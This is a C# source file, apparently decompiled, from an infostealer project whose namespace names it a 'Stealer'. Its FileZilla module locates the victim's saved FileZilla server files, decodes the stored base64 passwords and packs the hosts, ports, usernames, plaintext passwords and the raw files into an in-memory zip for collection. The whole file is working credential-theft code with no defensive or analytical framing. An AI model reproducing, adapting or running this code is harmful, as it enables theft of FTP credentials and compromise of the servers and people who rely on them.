using dominion.src.dominion.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace dominion.src.dominion.Stealer.Applications
{
    public class FileZilla : ITarget
    {
        // Token: 0x06000196 RID: 406 RVA: 0x0000DA54 File Offset: 0x0000BC54
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
            string[] array = new string[]
            {
                str + "recentservers.xml",
                str + "sitemanager.xml"
            };
            if (!File.Exists(array[0]) && !File.Exists(array[1]))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "FileZilla";
            List<string> list = new List<string>();
            foreach (string text in array)
            {
                if (File.Exists(text))
                {
                    XmlDocument xmlDocument = new XmlDocument();
                    xmlDocument.Load(text);
                    foreach (object obj in xmlDocument.GetElementsByTagName("Server"))
                    {
                        XmlNode xmlNode = (XmlNode)obj;
                        string text2;
                        if (xmlNode == null)
                        {
                            text2 = null;
                        }
                        else
                        {
                            XmlElement xmlElement = xmlNode["Pass"];
                            text2 = ((xmlElement != null) ? xmlElement.InnerText : null);
                        }
                        string text3 = text2;
                        if (!string.IsNullOrEmpty(text3))
                        {
                            string[] array3 = new string[5];
                            array3[0] = "ftp://";
                            int num = 1;
                            XmlElement xmlElement2 = xmlNode["Host"];
                            array3[num] = ((xmlElement2 != null) ? xmlElement2.InnerText : null);
                            array3[2] = ":";
                            int num2 = 3;
                            XmlElement xmlElement3 = xmlNode["Port"];
                            array3[num2] = ((xmlElement3 != null) ? xmlElement3.InnerText : null);
                            array3[4] = "/";
                            string text4 = string.Concat(array3);
                            XmlElement xmlElement4 = xmlNode["User"];
                            string text5 = (xmlElement4 != null) ? xmlElement4.InnerText : null;
                            string @string = Encoding.UTF8.GetString(Convert.FromBase64String(text3));
                            list.Add(string.Concat(new string[]
                            {
                                "Url: ",
                                text4,
                                "\nUsername: ",
                                text5,
                                "\nPassword: ",
                                @string
                            }));
                        }
                    }
                    string text6 = "FileZilla\\" + Path.GetFileName(text);
                    zip.AddFile(text6, File.ReadAllBytes(text));
                    counterApplications.Files.Add(text + " => " + text6);
                }
            }
            string text7 = "FileZilla\\Hosts.txt";
            counterApplications.Files.Add(text7 ?? "");
            zip.AddTextFile(text7, string.Join("\n\n", list.ToArray()));
            counter.Applications.Add(counterApplications);
        }
    }
}
